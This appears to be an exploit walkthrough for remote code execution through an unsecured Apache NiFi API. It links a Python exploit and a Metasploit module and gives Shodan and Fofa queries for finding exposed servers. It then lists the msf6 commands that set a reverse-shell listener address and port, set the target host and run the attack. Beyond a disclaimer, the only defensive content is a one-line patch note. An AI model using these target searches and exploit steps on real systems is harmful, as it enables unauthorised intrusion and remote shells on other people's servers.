# Apache NiFi Processor RCE (Oct 3 2020)
Apache NiFi is a software project to automate the flow of data between software systems.  
This module uses the NiFi API to create an ExecuteProcess processor that will execute OS commands. The API must be unsecured (or credentials provided) and the ExecuteProcess processor must be available. An ExecuteProcessor processor is created then is configured with the payload and started. The processor is then stopped and deleted.

API Executing Process: https://nifi.apache.org/docs/nifi-docs/components/org.apache.nifi/nifi-standard-nar/1.12.1/org.apache.nifi.processors.standard.ExecuteProcess/  

Vulnerable architectures: **x86, x64**  
Vulnerable platforms: **Linux, OSX, Unix, Windows**  
Vulnerable protocols: **http, https**  

**Please be aware that this exploit leaves signs of a compromise in a log file (Example: SQL injection data found in HTTP log) and modifies some configuration setting on the target machine, this is not a guide on how to exploit others, this is a guide on how to reproduce the vulnerability and how to fix it.**  

Python Raw Exploit: https://raw.githubusercontent.com/imjdl/Apache-NiFi-Api-RCE/master/exp.py  

MetaSploit Exploit: https://dl.packetstormsecurity.net/2011-exploits/apache_nifi_processor_rce.rb.txt  
MetaSploit Linux Default Payload: **cmd/unix/reverse_bash**  
MetaSploit Windows Default Payload: **cmd/windows/reverse_powershell**  

Shodan Query: `title:"NiFi"`  
Fofa Query: `title=="NiFi"`  

## Using apache_nifi_processor_rce's Exploit
<pre>msf6 > use exploit/multi/http/apache_nifi_processor_rce
[*] Using configured payload cmd/unix/reverse_bash</pre>
## Local IP for Reverse Shell Connection
<pre>msf6 exploit(multi/http/apache_nifi_processor_rce) > set LHOST 192.168.60.7
LHOST => 192.168.60.7</pre>
## Local Port for Reverse Shell Connection
<pre>msf6 exploit(multi/http/apache_nifi_processor_rce) > set LPORT 4444
LPORT => 4444</pre>
## Remote IP for Exploit Execution
<pre>msf6 exploit(multi/http/apache_nifi_processor_rce) > set RHOST 192.168.60.57
RHOST => 192.168.60.57</pre>
## Remote Port for Exploit Execution
<pre>msf6 exploit(multi/http/apache_nifi_processor_rce) > set RPORT 8080
RPORT => 8080</pre>
## Checking Current Exploit Options
<pre>msf6 exploit(multi/http/apache_nifi_processor_rce) > show options</pre>
![msf1](https://user-images.githubusercontent.com/94451745/149518743-e2ad0802-819a-4037-9798-8422f0c236c4.png)
## Running Exploit
<pre>msf6 exploit(multi/http/apache_nifi_processor_rce) > run</pre>
![msf2](https://user-images.githubusercontent.com/94451745/149520071-97c27099-82df-493b-9ead-a5a96afcc29b.png)
## Vulnerability patching
Upgrade to the latest version, add/change current credentials and setup an IP whitelist in your current firewall settings.
